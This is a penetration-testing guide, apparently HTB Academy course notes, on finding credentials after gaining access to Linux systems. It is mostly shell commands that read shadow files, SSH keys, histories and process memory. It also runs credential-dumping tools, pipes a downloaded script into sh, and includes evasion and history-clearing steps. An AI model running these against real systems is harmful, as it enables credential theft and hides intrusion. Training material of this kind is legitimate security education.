# Credential Hunting in Linux

## 🎯 Overview

**Linux credential hunting** focuses on discovering credentials stored in configuration files, history files, environment variables, and system logs after gaining access to a Linux system. Linux systems often contain:

- **SSH private keys** and certificates
- **Database connection strings** in application configs
- **API keys and tokens** in environment files
- **Service account credentials** in systemd units
- **Application passwords** in configuration files
- **Command history** with embedded credentials
- **Container secrets** and orchestration configs

> **"In Linux environments, credentials are often stored in plain text configuration files, making systematic file hunting extremely effective."**

## 🧠 Linux-Specific Credential Locations

### System Configuration Directories
```bash
/etc/                    # System-wide configuration files
/etc/passwd              # User account information  
/etc/shadow              # Password hashes (requires root)
/etc/sudoers             # Sudo configuration
/etc/crontab             # Scheduled tasks with potential credentials
/etc/fstab               # Filesystem mounts (SMB/NFS credentials)
/etc/network/interfaces  # Network configuration
/etc/wpa_supplicant/     # WiFi credentials
```

### User-Specific Locations
```bash
~/.ssh/                  # SSH keys and configuration
~/.aws/                  # AWS credentials
~/.config/               # Application configuration files
~/.local/share/          # Application data
~/.bashrc, ~/.zshrc      # Shell configuration
~/.bash_history          # Command history
~/.mysql_history         # MySQL command history
~/.lesshst               # Less command history
~/.viminfo               # Vim editor history
```

### Application-Specific Paths
```bash
/var/www/                # Web application files
/opt/                    # Third-party applications
/usr/local/              # Locally installed software
/home/*/                 # User home directories
/tmp/                    # Temporary files
/var/log/                # System and application logs
/var/lib/                # Application data directories
```

## 🎯 HTB Academy Enhanced Techniques

### HTB Academy File Extension Search Method
**One-liner approach for systematic file discovery by extension:**

```bash
# Search for configuration files (.conf, .config, .cnf)
for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done

# Search specific config files for credentials
for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done

# Search for database files
for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done

# Search for script files
for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done

# Search for notes and text files (including files without extensions)
find /home/* -type f -name "*.txt" -o ! -name "*.*"
```

### HTB Academy Log Analysis Method
**Targeted log file analysis for authentication and credential events:**

```bash
# Comprehensive log analysis for credential-related events
for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done

# Check bash history for all users
tail -n5 /home/*/.bash*

# Analyze crontab and scheduled tasks
cat /etc/crontab
ls -la /etc/cron.*/
```

## 🔍 File System Search Techniques

### 1. Find Command - File Discovery
```bash
# Search for files with "password" in filename
find / -name "*password*" -type f 2>/dev/null

# Search for configuration files
find / -name "*.conf" -o -name "*.config" -o -name "*.cfg" 2>/dev/null

# Search for script files
find / -name "*.sh" -o -name "*.py" -o -name "*.pl" 2>/dev/null

# Search for SSH keys
find / -name "id_rsa" -o -name "id_dsa" -o -name "id_ecdsa" -o -name "id_ed25519" 2>/dev/null

# Search for database files
find / -name "*.db" -o -name "*.sqlite" -o -name "*.sqlite3" 2>/dev/null

# Search for credential-related files
find / -name "*cred*" -o -name "*auth*" -o -name "*key*" 2>/dev/null

# Search for backup files (often contain passwords)
find / -name "*.bak" -o -name "*.backup" -o -name "*.old" 2>/dev/null

# Search for recently modified files (last 7 days)
find / -type f -mtime -7 2>/dev/null

# Search for files with specific permissions (world-readable secrets)
find / -type f -perm -o+r -name "*secret*" 2>/dev/null
```

### 2. Grep Command - Content Searching
```bash
# Search for password patterns in files
grep -r -i "password" /etc/ /var/ /opt/ 2>/dev/null

# Search for database connection strings
grep -r -i -E "(mysql|postgres|mongodb|oracle)" /etc/ /var/www/ /opt/ 2>/dev/null

# Search for API keys and tokens
grep -r -i -E "(api[_-]?key|token|secret)" /etc/ /var/ /opt/ 2>/dev/null

# Search for SSH connection strings
grep -r -i -E "(ssh|sftp|scp)" /etc/ /var/ /opt/ 2>/dev/null

# Search for network credentials
grep -r -i -E "(username|user|login)" /etc/ /var/ /opt/ 2>/dev/null

# Search for email credentials
grep -r -i -E "(smtp|imap|pop3|mail)" /etc/ /var/ /opt/ 2>/dev/null

# Search for AWS/Cloud credentials
grep -r -i -E "(aws|azure|gcp|cloud)" /etc/ /var/ /opt/ 2>/dev/null

# Search for encryption keys
grep -r -i -E "(BEGIN.*KEY|END.*KEY)" /etc/ /var/ /opt/ 2>/dev/null
```

### 3. Advanced Search Patterns
```bash
# Multi-pattern search
grep -r -i -E "(password|passwd|pwd|secret|key|token|auth|cred|login|user)" /etc/ 2>/dev/null

# Search for base64 encoded credentials
grep -r -E "[A-Za-z0-9+/]{20,}={0,2}" /etc/ /var/ /opt/ 2>/dev/null

# Search for hexadecimal keys (32+ chars)
grep -r -E "[a-fA-F0-9]{32,}" /etc/ /var/ /opt/ 2>/dev/null

# Search for IP addresses (potential internal services)
grep -r -E "([0-9]{1,3}\.){3}[0-9]{1,3}" /etc/ /var/ /opt/ 2>/dev/null

# Search for URLs with credentials
grep -r -E "(http|https|ftp)://[^:]+:[^@]+@" /etc/ /var/ /opt/ 2>/dev/null

# Search for connection strings
grep -r -i -E "(server=|host=|hostname=|database=|db=)" /etc/ /var/ /opt/ 2>/dev/null
```

## 📂 Specific Configuration File Hunting

### SSH Configuration and Keys
```bash
# SSH client configuration
cat ~/.ssh/config
cat /etc/ssh/ssh_config

# SSH server configuration
cat /etc/ssh/sshd_config

# Find all SSH private keys
find / -name "id_*" -type f 2>/dev/null | grep -v ".pub"

# Check SSH authorized_keys
cat ~/.ssh/authorized_keys
find / -name "authorized_keys" 2>/dev/null

# SSH known_hosts (contains hostnames/IPs)
cat ~/.ssh/known_hosts
cat /etc/ssh/ssh_known_hosts
```

### Database Configuration Files
```bash
# MySQL/MariaDB
cat /etc/mysql/my.cnf
cat ~/.my.cnf
find / -name "my.cnf" 2>/dev/null

# PostgreSQL
cat /etc/postgresql/*/main/postgresql.conf
cat ~/.pgpass
find / -name "postgresql.conf" 2>/dev/null

# MongoDB
cat /etc/mongod.conf
find / -name "mongod.conf" 2>/dev/null

# Redis
cat /etc/redis/redis.conf
find / -name "redis.conf" 2>/dev/null
```

### Web Application Configurations
```bash
# Apache
cat /etc/apache2/apache2.conf
find /etc/apache2/ -name "*.conf" -exec grep -l -i "password\|auth" {} \;

# Nginx
cat /etc/nginx/nginx.conf
find /etc/nginx/ -name "*.conf" -exec grep -l -i "password\|auth" {} \;

# PHP applications
find /var/www/ -name "config.php" -o -name "wp-config.php" -o -name "settings.php"
find /var/www/ -name "*.env" -o -name ".env.local"

# Python applications
find /var/www/ -name "settings.py" -o -name "config.py"
find /var/www/ -name "requirements.txt" -o -name "Pipfile"

# Node.js applications
find /var/www/ -name "package.json" -o -name ".env"
find /var/www/ -name "config.json" -o -name "app.js"
```

## 🕰️ History File Analysis

### Command History Files
```bash
# Bash history
cat ~/.bash_history
grep -i -E "(ssh|mysql|psql|password|passwd)" ~/.bash_history

# Zsh history
cat ~/.zsh_history
grep -i -E "(ssh|mysql|psql|password|passwd)" ~/.zsh_history

# Fish shell history
cat ~/.local/share/fish/fish_history

# All users' history files
find /home/ -name ".*_history" 2>/dev/null

# Search all history files for credentials
find / -name "*history*" -type f -exec grep -l -i "password\|secret\|key" {} \; 2>/dev/null
```

### Application History Files
```bash
# MySQL command history
cat ~/.mysql_history
grep -i -E "(password|create user|grant)" ~/.mysql_history

# PostgreSQL command history
cat ~/.psql_history
grep -i -E "(password|create user|grant)" ~/.psql_history

# Python REPL history
cat ~/.python_history

# Less command history
cat ~/.lesshst

# Vim command history
cat ~/.viminfo | grep -i -E "(password|secret|key)"
```

## 🌐 Environment Variables and Process Analysis

### Environment Variable Hunting
```bash
# Current environment variables
env | grep -i -E "(password|secret|key|token|auth)"
printenv | grep -i -E "(password|secret|key|token|auth)"

# Process environment variables
cat /proc/*/environ | strings | grep -i -E "(password|secret|key|token)"

# Check specific processes
ps aux | grep -E "(mysql|postgres|apache|nginx)"
cat /proc/$(pidof mysql)/environ | strings

# Systemd environment files
find /etc/systemd/ -name "*.conf" -exec grep -l -i "Environment" {} \;
cat /etc/environment
```

### Service and Daemon Analysis
```bash
# Systemd service files
find /etc/systemd/ -name "*.service" -exec grep -l -i -E "(password|secret|key)" {} \;

# Check service status and environment
systemctl status --all | grep -i -E "(password|error|fail)"

# Crontab analysis
cat /etc/crontab
ls -la /etc/cron.*
crontab -l 2>/dev/null

# Check all users' crontabs
for user in $(cut -f1 -d: /etc/passwd); do echo "=== $user ==="; crontab -u $user -l 2>/dev/null; done
```

## 📊 Log File Analysis

### System Logs
```bash
# Authentication logs
grep -i -E "(password|failed|success)" /var/log/auth.log
grep -i -E "(password|failed|success)" /var/log/secure

# System logs
grep -i -E "(password|secret|key|error)" /var/log/syslog
grep -i -E "(password|secret|key|error)" /var/log/messages

# Application logs
find /var/log/ -name "*.log" -exec grep -l -i -E "(password|secret|key)" {} \;

# Web server logs
grep -i -E "(password|login|auth)" /var/log/apache2/access.log
grep -i -E "(password|login|auth)" /var/log/nginx/access.log
```

### Application-Specific Logs
```bash
# Database logs
find /var/log/ -name "*mysql*" -exec grep -l -i "password" {} \;
find /var/log/ -name "*postgres*" -exec grep -l -i "password" {} \;

# Mail server logs
grep -i -E "(password|auth|login)" /var/log/mail.log

# FTP logs
grep -i -E "(password|login|user)" /var/log/vsftpd.log
```

## 🔧 Linux-Specific Tools and Techniques

### 1. Mimipenguin - Linux Memory Credential Extraction
```bash
# Download mimipenguin
wget https://github.com/huntergregal/mimipenguin/raw/master/mimipenguin.py
chmod +x mimipenguin.py

# Run mimipenguin (requires root privileges)
sudo python3 mimipenguin.py

# Example output:
# [SYSTEM - GNOME]	cry0l1t3:WLpAEXFa0SbqOHY
```

**Mimipenguin extracts credentials from:**
- GNOME Keyring
- VSFTPd processes
- Apache2 processes
- SSH agent processes
- IRSSI IRC client
- Various system processes

### 2. LaZagne for Linux
```bash
# Download and run LaZagne
wget https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne
chmod +x lazagne

# Run all modules (Python 2.7 version)
sudo python2.7 laZagne.py all

# Example output:
# [+] Hash found !!!
# Login: sambauser
# Hash: $6$wgK4tGq7Jepa.V0g$QkxvseL.xkC3jo682xhSGoXXOGcBwPLc2CrAPugD6PYXWQlBkiwwFs7x/fhI...

# Target specific modules
./lazagne browsers    # Firefox, Chrome
./lazagne sysadmin    # SSH, FTP clients
./lazagne databases   # MySQL, PostgreSQL clients
./lazagne memory      # Memory dumps
```

### 3. Firefox Decrypt - Browser Credential Extraction
```bash
# Download firefox_decrypt
wget https://github.com/unode/firefox_decrypt/raw/master/firefox_decrypt.py
chmod +x firefox_decrypt.py

# Find Firefox profiles
ls -l ~/.mozilla/firefox/ | grep default

# Decrypt Firefox credentials (requires Python 3.9+)
python3.9 firefox_decrypt.py

# Example output:
# Website:   https://www.inlanefreight.com
# Username: 'cry0l1t3'
# Password: 'FzXUxJemKm6g2lGh'

# Alternative: Use LaZagne for browsers
python3 laZagne.py browsers
```

**Firefox credential files:**
```bash
# Firefox stored credentials location
~/.mozilla/firefox/[profile]/logins.json

# View encrypted credentials
cat ~/.mozilla/firefox/1bplpd86.default-release/logins.json | jq .

# Manual decryption locations
~/.mozilla/firefox/[profile]/key4.db    # Master key database
~/.mozilla/firefox/[profile]/cert9.db   # Certificate database
```

### 4. LinPEAS (Linux Privilege Escalation Awesome Scripts)
```bash
# Download and run LinPEAS
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Or run specific checks
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh -a  # All checks including passwords
```

### 5. Custom Linux Credential Scripts
```bash
#!/bin/bash
# credHunter.sh - Linux credential hunting script

echo "=== SSH Key Discovery ==="
find / -name "id_*" -type f 2>/dev/null | head -20

echo "=== Configuration Files ==="
find /etc/ -name "*.conf" 2>/dev/null | xargs grep -l -i "password" 2>/dev/null

echo "=== History Analysis ==="
find /home/ -name ".*_history" 2>/dev/null | xargs grep -l -i -E "(ssh|mysql|password)" 2>/dev/null

echo "=== Environment Variables ==="
env | grep -i -E "(password|secret|key|token)"

echo "=== Recent Files ==="
find / -type f -mtime -1 2>/dev/null | head -20
```

## 🐳 Container and Orchestration Credential Hunting

### Docker Credential Hunting
```bash
# Docker configuration
cat ~/.docker/config.json

# Docker environment files
find / -name ".env" -path "*/docker/*" 2>/dev/null

# Docker Compose files
find / -name "docker-compose.yml" -o -name "docker-compose.yaml" 2>/dev/null

# Check running containers
docker ps 2>/dev/null
docker exec -it <container_id> env 2>/dev/null

# Docker secrets (if accessible)
ls -la /var/lib/docker/swarm/
```

### Kubernetes Credential Hunting
```bash
# Kubernetes configuration
cat ~/.kube/config

# Service account tokens
cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null

# ConfigMaps and Secrets (if accessible)
kubectl get configmaps --all-namespaces 2>/dev/null
kubectl get secrets --all-namespaces 2>/dev/null

# Pod environment variables
kubectl describe pods --all-namespaces 2>/dev/null | grep -i -A5 -B5 "Environment"
```

## 🔍 Memory and Process Credential Extraction

### Process Memory Analysis
```bash
# Dump process memory (requires appropriate privileges)
gcore <PID>
strings core.<PID> | grep -i -E "(password|secret|key|token)"

# Search process memory directly
grep -a -i "password" /proc/<PID>/mem 2>/dev/null

# Check process command lines
cat /proc/*/cmdline | strings | grep -i -E "(password|secret|key)"

# Process environment variables
cat /proc/*/environ | strings | grep -i -E "(password|secret|key|token)"
```

### System Memory Analysis
```bash
# Dump physical memory (requires root)
dd if=/dev/mem of=memory.dump bs=1M count=100 2>/dev/null
strings memory.dump | grep -i -E "(password|secret|key|token)"

# Search in /dev/kmem (if available)
strings /dev/kmem | grep -i -E "(password|secret|key)" 2>/dev/null
```

## 📋 Systematic Linux Credential Hunting Checklist

### Phase 1: Initial Reconnaissance
```bash
# System information
uname -a
id
groups
sudo -l

# Check current directory and home
pwd
ls -la
ls -la ~
```

### Phase 2: File System Discovery
```bash
# Find credential-related files
find / -name "*password*" -o -name "*secret*" -o -name "*key*" -o -name "*cred*" 2>/dev/null

# Configuration files
find /etc/ -name "*.conf" -o -name "*.config" -o -name "*.cfg" 2>/dev/null | head -50

# User files
find /home/ -name ".*" -type f 2>/dev/null | head -50
```

### Phase 3: Content Analysis
```bash
# Search file contents
grep -r -i -E "(password|passwd|secret|key|token)" /etc/ 2>/dev/null | head -20
grep -r -i -E "(password|passwd|secret|key|token)" /var/ 2>/dev/null | head -20
grep -r -i -E "(password|passwd|secret|key|token)" /opt/ 2>/dev/null | head -20
```

### Phase 4: History and Environment
```bash
# Command history
cat ~/.bash_history | grep -i -E "(ssh|mysql|password|secret)"
cat ~/.zsh_history | grep -i -E "(ssh|mysql|password|secret)"

# Environment variables
env | grep -i -E "(password|secret|key|token|auth)"

# Process analysis
ps aux | grep -v grep
```

### Phase 5: Application-Specific Hunting
```bash
# Web applications
find /var/www/ -name "*.php" -o -name "*.py" -o -name "*.js" | xargs grep -l -i "password" 2>/dev/null

# Databases
find / -name "*mysql*" -o -name "*postgres*" -o -name "*mongo*" 2>/dev/null

# SSH
find / -name "id_*" 2>/dev/null | grep -v ".pub"
cat ~/.ssh/config 2>/dev/null
```

## 🛡️ Detection Evasion for Linux

### Stealth Techniques
```bash
# Use built-in commands instead of external tools
grep instead of custom scanners

# Time-delayed searches
sleep 5 && find / -name "*password*" 2>/dev/null

# Limit output to avoid detection
find / -name "*secret*" 2>/dev/null | head -10

# Use process substitution to avoid writing files
grep -r "password" <(find /etc/ -name "*.conf" 2>/dev/null)
```

### Cleanup Commands
```bash
# Clear command history
history -c
unset HISTFILE

# Remove temporary files
rm -f /tmp/creds.txt
rm -f core.*

# Clear environment variables
unset PASSWORD
unset SECRET_KEY
```

## 🎯 HTB Academy Lab Example

### Lab Scenario
- **Target**: SSH access to Linux system
- **Initial Access**: `ssh kira@TARGET_IP` with password `L0vey0u1!`
- **Objective**: Find the password of user "Will"

### Systematic Approach
```bash
# Step 1: Initial system reconnaissance
whoami
id
uname -a
ls -la

# Step 2: Search for configuration files
for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done

# Step 3: Search for credentials in found files
for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done

# Step 4: Check command history
tail -n5 /home/*/.bash*
cat ~/.bash_history | grep -i -E "(password|pass|secret|will)"

# Step 5: Search for user-specific files
find /home/ -name "*will*" -o -name "*password*" 2>/dev/null
find /home/ -type f -name "*.txt" 2>/dev/null

# Step 6: Check running processes and environment
ps aux | grep will
env | grep -i pass

# Step 7: Memory-based extraction (if root access available)
sudo python3 mimipenguin.py

# Step 8: Browser credential extraction (if applicable)
ls -la ~/.mozilla/firefox/
python3 firefox_decrypt.py
```

### Common Discovery Patterns
1. **Password in bash history** - Previous commands containing Will's password
2. **Configuration files** - Application configs with embedded credentials
3. **Text files** - Documentation or note files with passwords
4. **Environment variables** - Process environment containing credentials
5. **Memory extraction** - Running processes with cached passwords

## 💡 Key Takeaways for Linux Credential Hunting

1. **File system is king** - Linux stores most credentials in plain text files
2. **History tells stories** - Command history often contains credentials
3. **Environment variables** - Modern applications use env vars for secrets
4. **SSH keys everywhere** - Private keys are common and valuable
5. **Log files reveal secrets** - Applications often log credential errors
6. **Container secrets** - Docker/K8s environments have new credential stores
7. **Process memory** - Running applications may have credentials in memory
8. **Configuration diversity** - Every application has its own config format
9. **HTB Academy methodology** - Systematic file extension searches are highly effective
10. **Memory-based tools** - Mimipenguin complements file-based searches

---

*This comprehensive guide covers Linux credential hunting techniques for post-exploitation scenarios and penetration testing engagements, enhanced with HTB Academy specific methods and tools.* 